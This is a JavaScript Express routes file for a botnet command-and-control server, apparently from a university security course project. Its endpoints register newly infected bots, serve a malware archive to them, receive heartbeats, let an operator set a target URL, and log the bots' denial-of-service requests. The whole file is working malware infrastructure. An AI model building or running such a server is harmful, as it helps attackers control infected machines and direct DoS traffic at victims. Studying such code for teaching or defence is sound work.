// This module handles all routes incoming to the server
// Endpoints are called out at the bottom of the file
// Callback functions are then used to handle the incoming request

// Imported modules for this file
const express = require('express')
const debug = require('debug')('server:handleRoutes')
const chalk = require('chalk')
const moment = require('moment')

// Imported files used to handle routes
const bots = require('../controllers/bots')

// Initializing express middleware Router for handling routes in this module
const routes = express.Router()

// Router function to handle routes.  This function gets exported from this module
function router() {

  // Admin callback function for GET: /admin
  // The server uses this endpoint to review details about existing bots and attacks, and to set the target URL for attacks
  // Uses the bots controller to return list of bots, a target URL and a list of attacks
  // Passes the returned data in the response to be rendered in the dashboard display
  async function admin(req, res) {
    try {
      var botsArray = bots.getBots()    // List of existing bots connected to server
      var target = bots.getTarget()     // Target URL for bots to attack
      var attacks = bots.getAttacks()   // List of executed attacks to target URL
      res.render('admin', {
        currentTime: moment().format('L, LTS'),
        bots: botsArray,
        target: target,
        attacks: attacks
      })
    } catch (err) {
      console.log(err)
      res.sendStatus(500)
    }
  }

  // Landing callback function for POST: /landing
  // Bots call this endpoint once they're infected, passing their metadata for the server to store
  // Takes the request body and checks if a bot exists
  // If a bot exists we use the bots controller to add the new bot
  // Responds accordingly. 
  async function landing(req, res) {
    const bot = req.body
    try {
      if (Object.keys(bot).length !== 0) {
        let added = await bots.add(bot)
        if (added) {
          res.sendStatus(200)
        } else {
          res.send('Bot already exists')
        }
      } else {
        res.send('Did not recieve a bot in payload')
      }
    } catch (error) {
      console.log(error)
      res.sendStatus(500)
    }
  }

  // Send File callback function for GET: /sendFile
  // Bots call this endpoint to return the malware
  // Express finds the file on the server with sendFile
  // Sends Malware back with the response
  async function sendFile(res, res) {
    res.sendFile("/Users/matthewrusczyk/dev/security/CS492_finalproject_botnet/client.tar.gz");
  }
  
  // Heartback callback function for GET: /heartbeat/:ip
  // Bots will hit endpoint repeatedly to inform server if bots are still running and infected
  // Takes the ip query parameter and passes it to the bots heartbeat() controller function
  // Sends the response back from the heartbeat() function
  // Response would include the target URL if one exists
  async function heartbeat(req, res) {
    debug('HEARTBEAT')
    const { ip } = req.params
    try {
      var response = await bots.heartbeat(ip)
      res.send(response)
    } catch (error) {
      console.log(error)
      res.sendStatus(500)
    }
    
  }
  
  // Target callback function for POST: /target
  // Used to handle the form request from /admin view to handle the requested targer ULR
  // Takes the url query parameter and passes it to the bots setTarget controller function
  async function target(req, res) {
    const { url } = req.body
    try {
      var response = await bots.setTarget(url)
      if (response === url) {
        res.redirect('/admin')
      }
    } catch (error) {
      console.log(error)
      res.sendStatus(500)
    }
  }

  // Attack callback function for GET: /attack
  // Used once a target URL has been set
  // Bots will repeated hit this endpoint to portray a DoS attack
  // We grab the user-agent from the attacker to document the attack
  // Response with a 200 status if target URL exists, otherwise response with a 403 status
  async function attack(req, res) {
    let attack = req.get('user-agent')
    // debug(req.useragent)
    try {
      var response = await bots.documentAttack(attack)
      if (response) {
        res.sendStatus(200)
      } else {
        res.sendStatus(403)
      }
    } catch (error) {
      console.log(error)
      res.sendStatus(500)
    }
  }

  // ENDPOINTS handled in this module with their corresponding callback functions
  routes.get('/admin', admin)
  routes.post('/landing', landing)
  routes.get('/heartbeat/:ip', heartbeat)
  routes.get('/sendFile', sendFile)
  routes.post('/target', target)
  routes.get('/attack', attack)


  return routes
}

module.exports = router()